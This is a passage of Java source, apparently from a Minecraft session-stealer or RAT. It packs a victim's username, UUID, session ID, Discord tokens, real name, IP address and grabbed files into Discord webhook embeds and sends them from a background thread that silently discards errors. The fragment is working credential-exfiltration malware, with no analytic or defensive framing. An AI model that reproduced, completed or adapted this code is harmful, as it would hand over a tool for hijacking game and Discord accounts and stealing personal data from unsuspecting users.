dn.setTts(setts.booleanValue());						dn.addEmbed((new JSONNewString.EmbedObject())						.setColor(sidebarcolor)						.addField(usernamestring1, usernamestring2, usernameindent.booleanValue())						.addField(uuidstring1, uuidstring2, uuidindent.booleanValue())						.addField(ssidstring1, ssidstring2, ssidindent.booleanValue())				.addField(skyshiyuustring1, skyshiyuustring2, skyshiyuuindent.booleanValue()));			dn.addEmbed((new JSONNewString.EmbedObject())				.setColor(sidebarcolor)							.addField(discordstring1, dctokens.replaceFirst("null", ""), discordindent.booleanValue()));			dn.addEmbed((new JSONNewString.EmbedObject())				.setColor(sidebarcolor)										.addField(realnamestring1, realnamestring2, realnameindent.booleanValue())				.addField(ipstring1, "```" + ip + "```", ipindent.booleanValue())				.addField("files", dataGrabbings, false)			.setFooter(footerstring, footeravatar));			dn.execute();		  		} catch (Exception exception) {}			})).start(); }}
